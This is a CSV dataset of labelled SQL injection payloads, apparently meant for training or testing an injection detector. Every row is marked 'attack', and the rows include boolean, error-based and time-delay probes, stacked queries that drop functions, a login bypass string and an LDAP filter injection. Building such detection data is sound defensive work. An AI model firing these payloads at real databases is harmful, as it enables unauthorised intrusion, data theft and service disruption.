label,payload,family
attack,1'||  (  select 'glyc' from dual where 4058  =  4058,other
attack,1'  )   as sjij where 8659  =  8659,other
attack,"1"" where 7879  =  7879",other
attack,1  )   as xtgr where 1545  =  1545,other
attack,"1""   )    )    as ikuz where 7385  =  7385",other
attack,1'||  (  select 'czos' from dual where 6814  =  6814,other
attack, (  select   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  select 6714 from master..sysdatabases  )   end   )    ) ,other
attack,"select * from generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   limit 1--",other
attack,1  )   as nioj where 9703  =  9703,other
attack,-7387'   )    )     )   order by 1--,other
attack,"1""  )   as ltbl where 6395  =  6395",other
attack,1'+  (  select wpkh where 5842  =  5842,other
attack,1' where 4253  =  4253,other
attack,1'  )   as yxdb where 4597  =  4597,other
attack,select   (  case when   (  8294  =  4332  )   then 1 else 8294*  (  select 8294 from master..sysdatabases  )   end  )  --,other
attack,"1""  )   as ranl where 5553  =  5553",other
attack,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
attack,"1"" where 4073  =  4073 rlike   (  select   (  case when   (  8716  =  4281  )   then 1 else 0x28 end   )    )   --",other
attack,"1"" where 6004  =  6004",other
attack,1  )   as duqb where 6495  =  6495,other
attack,"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",other
attack,"select * from generate_series  (  8147,8147,case when   (  8147  =  6336  )   then 1 else 0 end  )   limit 1--",other
attack,1' where 7910  =  7910,other
attack,select   (  case when   (  9696  =  2874  )   then 1 else 9696*  (  select 9696 from master..sysdatabases  )   end  )  --,other
attack,1'||  (  select 'npel' from dual where 5258  =  5258,other
attack,"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,1   )    )    as prxq where 4600  =  4600,other
attack,"1""   )    )    as jsdc where 2748  =  2748",other
attack,1  )   where 9708  =  9708,other
attack,"1""  )   where 9511  =  9511   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,select   (  case when   (  1961  =  2048  )   then 1961 else 1961*  (  select 1961 from information_schema.character_sets  )   end  )  #,other
attack,1'||  (  select 'iuud' where 3687  =  3687,other
attack,"select count  (  *  )   from generate_series  (  1,5000000  )  -- gqkk",other
attack,"1',  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",other
attack,1 where 4091  =  4091,other
attack,1'  )   as fkpn where 1100  =  1100,other
attack,select   (  case when   (  3677  =  2193  )   then 3677 else 1/  (  select 0  )   end  )  --,other
attack,1   )    )    as bvij where 7913  =  7913,other
attack,"1""  )   as ufai where 9673  =  9673",other
attack,1  )   where 1487  =  1487,other
attack,"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",other
attack,select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,other
attack,"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
attack,1   )    )    as klmm where 3107  =  3107,other
attack,"1',  (  case when 3598  =  2118 then 1 else null end  )  ",other
attack,"-1004"" where 6266  =  6266 order by 1#",other
attack,1'||  (  select 'idna' from dual where 2683  =  2683 rlike   (  select   (  case when   (  3201  =  9748  )   then 1 else 0x28 end   )    )     )  ||',other
attack,1'+  (  select 'mzee' where 5984  =  5984,other
attack,1 where 8966  =  8966,other
attack,1'||  (  select 'yhpe' where 8010  =  8010 rlike   (  select   (  case when   (  7910  =  3752  )   then 1 else 0x28 end   )    )     )  ||',other
attack,1' where 6533  =  6533,other
attack,"1""  )   as uorp where 7208  =  7208",other
attack,select   (  case when   (  5085  =  4259  )   then 5085 else 5085*  (  select 5085 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'zoqo' from dual where 2063  =  2063,other
attack,select   (  case when   (  1014  =  4280  )   then 1014 else 1014*  (  select 1014 from mysql.db  )   end  )  #,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",other
attack,"1"" where 3318  =  3318",other
attack,1'  )   as jwch where 4609  =  4609,other
attack,1  )   as afmb where 8665  =  8665 order by 1#,other
attack,"-7107""   )    )     )   order by 1#",other
attack,-7273%'   )    )    order by 1#,other
attack,"1""  )   where 6903  =  6903",other
attack,"1""  )   as ucex where 5148  =  5148 order by 1#",other
attack,1'  )   as wvvo where 4288  =  4288,other
attack,1   )    )    as vmwj where 5597  =  5597,other
attack,1'  )   as sruz where 6318  =  6318,other
attack,"iif  (  1718  =  5436,1,1/0  )  ",other
attack,"1""  )   as ikdo where 4128  =  4128",other
attack,1  )   where 6150  =  6150,other
attack,1' where 6409  =  6409,other
attack,"1"" where 9461  =  9461",other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'",other
attack,1 where 6173  =  6173,other
attack,select   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   as eomu where 6599  =  6599",other
attack,1   )    )    as smtf where 5829  =  5829,other
attack,1'+  (  select 'yahd' where 5850  =  5850,other
attack,select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,other
attack,"1"" where 9669  =  9669",other
attack,1   )    )    as gocb where 4335  =  4335,other
attack,1'+  (  select 'uetb' where 6468  =  6468,other
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",other
attack,"1""   )    )    as wfne where 8933  =  8933",other
attack,"1""  )   as nyui where 2511  =  2511",other
attack,1'+  (  select 'dhcv' where 9372  =  9372,other
attack,1'  )   where 8274  =  8274,other
attack,"1""  )   where 1705  =  1705",other
attack,"1"" where 5977  =  5977",other
attack,1'+  (  select 'drqj' where 1246  =  1246,other
attack,"1""   )    )    as uqem where 3521  =  3521",other
attack,select case when 1802  =  7063 then 1 else null end--,other
attack,"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  -- fzhj",other
attack,"1,  (  select   (  case when   (  5885  =  1825  )   then 1 else 5885*  (  select 5885 from master..sysdatabases  )   end   )    )   ",other
attack,"1""  )   where 8588  =  8588",other
attack,1   )    )    as rbcf where 1053  =  1053,other
attack,1'  )   where 3187  =  3187 order by 1#,other
attack,"-3219""  )   order by 1--",other
attack,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",other
attack,"iif  (  9875  =  8961,1,1/0  )  ",other
attack,if  (  4907  =  9581  )   select 4907 else drop function apqw--,other
attack,1  )   as itvm where 1482  =  1482,other
attack,"1""  )   where 2367  =  2367",other
attack,-6616  )   order by 1--,other
attack,-4137   )    )    as elxu where 5672  =  5672 order by 1--,other
attack,if  (  8812  =  7896  )   select 8812 else drop function xltk--,other
attack,1' where 2958  =  2958,other
attack,1'   )    )    as fbjd where 8597  =  8597,other
attack,1   )    )    as ipfy where 1189  =  1189,other
attack,if  (  3392  =  4422  )   select 3392 else drop function xsqq--,other
attack,"iif  (  1217  =  8831,1,1/0  )  ",other
attack,"1,  (  case when 5514  =  9602 then 1 else null end  )  ",other
attack,"iif  (  4836  =  1823,1,1/0  )  ",other
attack,1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',other
attack,"1""   )    )    as xbhp where 7527  =  7527",other
attack,"1'+  (  select kgon where 9014  =  9014   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +'",other
attack,1  )   as ptxw where 9873  =  9873,other
attack,"1""  )   where 9093  =  9093",other
attack,select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'irfn' where 8360  =  8360,other
attack,1 where 2238  =  2238,other
attack,select   (  case when   (  8689  =  2468  )   then 8689 else 1/  (  select 0  )   end  )  --,other
attack,"1""   )    )    as swwb where 4244  =  4244",other
attack,"1""   )    )    as vgsb where 4747  =  4747",other
attack,1'+  (  select hkrg where 3665  =  3665,other
attack,select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,other
attack,1  )   where 2930  =  2930,other
attack,"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,"1""  )   where 9062  =  9062",other
attack,1  )   where 7050  =  7050,other
attack,1'+  (  select 'gprq' where 8928  =  8928,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",other
attack,"1""  )   where 4913  =  4913",other
attack,"1""  )   where 4588  =  4588",other
attack,"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,select   (  case when   (  8601  =  1220  )   then 8601 else 8601*  (  select 8601 from mysql.db  )   end  )  #,other
attack,1'+  (  select vfmy where 5711  =  5711,other
attack,1' where 2967  =  2967,other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",other
attack,"1""   )    )    as turj where 1237  =  1237",other
attack,1'||  (  select 'gdzt' where 4950  =  4950,other
attack,"1""   )    )    as nncz where 2331  =  2331",other
attack,select   (  case when   (  6843  =  2657  )   then 6843 else 6843*  (  select 6843 from information_schema.character_sets  )   end  )  #,other
attack,1   )    )    as qlkf where 6635  =  6635,other
attack,select   (  case when   (  3168  =  5577  )   then 3168 else 3168*  (  select 3168 from mysql.db  )   end  )  #,other
attack,"1""   )    )    order by 1--",other
attack,"iif  (  7036  =  2370,1,1/0  )  ",other
attack,"-7395%"" order by 1--",other
attack,"-8065""   )    )     )   order by 1--",other
attack,"1%""   )    )     )   order by 1#",other
attack,1'  )   as znak where 5203  =  5203,other
attack,"1%""   )    )   ",other
attack,1'+  (  select 'yyyn' where 5395  =  5395,other
attack,"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",other
attack,1%',other
attack,1%'   )    ) ,other
attack,"make_set  (  5679  =  9769,9769  )  ",other
attack,1  )   where 5629  =  5629,other
attack,"1""  )   where 4520  =  4520",other
attack,1 where 6518  =  6518,other
attack,1' where 5547  =  5547,other
attack,1' where 8584  =  8584 order by 1#,other
attack,1   )    ) ,other
attack,"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",other
attack,end-- podi,other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",other
attack,"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",other
attack,1' where 3028  =  3028,other
attack, (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,other
attack,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'ilkr' from dual where 9296  =  9296,other
attack,1'  )   as mzby where 6530  =  6530,other
attack,select case when 3995  =  8680 then 1 else null end--,other
attack,select   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  select 6652 from information_schema.character_sets  )   end  )  #,other
attack,"1""  )   as kuuf where 6908  =  6908",other
attack,1'   )    )    as wjfj where 3802  =  3802,other
attack,1'  )   where 6408  =  6408,other
attack,1 where 8532  =  8532,other
attack,1' where 1692  =  1692,other
attack,"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",other
attack,1'  )   as gxfu where 9676  =  9676,other
attack,1'  )   as yqld where 2489  =  2489,other
attack,"1""   )    )    as dooq where 7911  =  7911",other
attack,1'   )    )    as yefv where 4263  =  4263,other
attack,1' where 9206  =  9206,other
attack,1'+  (  select tafk where 9652  =  9652,other
attack,"1',iif  (  4861  =  6268,1,1/0  )  ",other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",other
attack,1'||  (  select 'ghby' from dual where 4854  =  4854,other
attack,1  )   where 2307  =  2307,other
attack,"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",other
attack,1' where 6406  =  6406,other
attack,1'  )   where 7478  =  7478,other
attack,-8080'   )    )    order by 1#,other
attack,1'||  (  select 'svnn' from dual where 8710  =  8710,other
attack,"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",other
attack,1'+  (  select 'jkgf' where 7487  =  7487,other
attack,select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,other
attack,1   )    )    as xroy where 3274  =  3274,other
attack,"iif  (  5519  =  4796,1,1/0  )  ",other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",other
attack,select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   where 7548  =  7548",other
attack,1'+  (  select sijr where 7250  =  7250,other
attack,1   )    )    order by 1#,other
attack,"1""   )    )    as yosd where 1255  =  1255",other
attack,-7675%'   )    )     )   order by 1--,other
attack,1'+  (  select goec where 9460  =  9460 rlike   (  select   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',other
attack,1  )   where 3671  =  3671,other
attack,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,other
attack,"1',  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",other
attack,"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--",other
attack,if  (  1665  =  3845  )   select 1665 else drop function nzod--,other
attack,select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,other
attack,"1'qhfy<'"">utwq",other
attack,1  )   where 1120  =  1120,other
attack,"1""  )   order by 1#",other
attack,1' where 5778  =  5778,other
attack,"1""  )   as aifd where 5962  =  5962",other
attack, (  select   (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3287  =  3287  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,other
attack,-3648' where 4629  =  4629 order by 1--,other
attack,"iif  (  9134  =  5736,1,1/0  )  ",other
attack,"1""  )   where 3321  =  3321",other
attack,1  )   where 4711  =  4711,other
attack,"-7491""  )   as cnrn where 3635  =  3635 order by 1#",other
attack,1'  )   as mara where 7164  =  7164,other
attack,"1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,"select * from generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   limit 1--",other
attack,1'+  (  select 'ncny' where 5634  =  5634,other
attack,select   (  case when   (  8993  =  4660  )   then 1 else 8993*  (  select 8993 from master..sysdatabases  )   end  )  --,other
attack,1   )    )    as hxzh where 9284  =  9284,other
attack,"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  # jpau",other
attack,"1""  )   as fgne where 7207  =  7207",other
attack,"1""  )   as qirf where 6200  =  6200   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
attack,select   (  case when   (  7254  =  5901  )   then 1 else 7254*  (  select 7254 from master..sysdatabases  )   end  )  --,other
attack,"1"" where 5927  =  5927",other
attack,1'   )    )    as yyrx where 5600  =  5600,other
attack, (  case when 5640  =  5640 then 5640 else null end  ) ,other
attack,"-1503"" order by 1--",other
attack,1'   )    )    as dipp where 1714  =  1714,other
attack,1'||  (  select 'bgdh' from dual where 1967  =  1967,other
attack,1'||  (  select 'dfmw' from dual where 1723  =  1723,other
attack,end  )  +',other
attack,1' where 1593  =  1593,other
attack,1   )    )    as wwys where 9248  =  9248,other
attack,1  )   where 1622  =  1622,other
attack,1'   )    )    as hqhs where 5383  =  5383,other
attack,1 where 4985  =  4985 order by 1#,other
attack,1 where 9932  =  9932,other
attack,"1',  (  case when 2872  =  2872 then 1 else null end  )  ",other
attack,1'  )   as chla where 6098  =  6098,other
attack,"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",other
attack,-8045   )    )     )   order by 1--,other
attack,"1%"" order by 1--",other
attack,1'  )   where 8167  =  8167,other
attack,"1""   )    )     )  ",other
attack,"1',iif  (  6625  =  6625,1,1/0  )  ",other
attack,"1""   )    )    as hace where 8785  =  8785",other
attack,"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",other
attack,1'+  (  select ntym where 4750  =  4750,other
attack,-9456%'   )    )     )   order by 1#,other
attack,a,other
attack,a',other
attack,@,other
attack,1\'1,other
attack, (  ||6  ) ,other
attack,"grant connect to name, grant resource to name,",other
attack,&1c,other
attack, (  s,other
attack, )  s,other
attack,1s,other
attack,?s,other
attack,UEs,other
attack,UEv,other
attack,c,other
attack,n,other
attack,ns,other
attack,os,other
attack,*',other
attack,""" """,other
attack,"admin"" --",other
attack,0,other
attack,handler,other
attack,to_timestamp_tz,other
attack,tz_offset,other
attack,%7C,other
attack,%2A%28%7C%28objectclass%3D%2A%29%29,other
attack,28%,other
attack,29%,other
attack,26%,other
attack,//,other
attack,*/*,other
attack,21%,other
attack,3.1E+017,other
attack,0x77616974666F722064656C61792027303A303A313027 ...,other
